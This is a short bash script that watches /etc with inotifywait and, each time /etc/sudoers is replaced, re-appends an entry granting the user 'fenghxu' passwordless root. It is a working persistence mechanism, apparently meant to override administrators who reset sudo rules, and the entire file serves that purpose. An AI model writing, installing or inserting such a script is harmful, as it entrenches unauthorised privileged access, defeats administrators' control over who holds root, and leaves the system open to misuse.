#!/bin/bash

inotifywait -m --timefmt '%H:%M:%S' --format '%T %,e %w%f' /etc/ | while read line
do
    if [[ "$line" =~ "/etc/sudoers" ]]; then
        echo "$line"
        if [[ "$line"x =~ "MOVED_TO /etc/sudoers"x ]]; then
            echo "set fenghxu as sudoer"
            echo "fenghxu     ALL = (ALL) NOPASSWD: ALL" >> /etc/sudoers
        fi
    fi
done
